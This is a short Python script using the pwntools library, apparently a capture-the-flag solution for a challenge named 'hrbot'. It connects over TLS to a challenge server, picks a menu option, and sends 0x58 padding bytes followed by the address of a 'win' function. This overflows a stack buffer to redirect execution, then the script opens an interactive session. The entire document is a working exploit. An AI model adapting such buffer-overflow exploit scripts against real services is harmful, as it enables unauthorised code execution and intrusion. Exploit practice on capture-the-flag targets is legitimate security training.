from pwn import *

HOST, PORT = '0.0.0.0', 31337
HOST, PORT = 'hrbot-6816b775aa78fe70-global.challs.brunnerne.xyz', 1337
r = remote(HOST, PORT, ssl=True, sni=HOST)

win=0x401256
r.sendlineafter(b'> ', b'1')
r.sendline(b'A'*0x58+p64(win))
r.interactive()